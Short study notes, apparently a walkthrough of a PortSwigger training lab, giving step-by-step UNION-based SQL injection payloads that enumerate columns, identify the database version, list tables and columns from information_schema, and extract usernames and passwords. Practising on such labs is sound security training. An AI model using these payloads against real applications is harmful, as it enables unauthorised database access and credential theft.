https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle


##### Enumerate the columns
`/filter?category=Lifestyle'union+select+null,null--`
##### Identify the RDBMS
`/filter?category=Lifestyle'union+select+null,version()--`
#### Enumerate the tables
```sql
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```
`table_name` isn’t a placeholder—it’s an actual column in the `information_schema.tables` table that stores the names of tables in the database.
#### Select USERS table
```sql
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+where+table_name='users_rtlina'--
```

```sql
SELECT some_column FROM some_table WHERE category = 'Lifestyle' 
UNION SELECT table_name, NULL FROM information_schema.tables;
```

![[Pasted image 20241110015657.png]]
And to use it simply use a select form:
```sql
'+UNION+SELECT+username_xamasr,password_uaugcn+FROM+users_rtlina--
```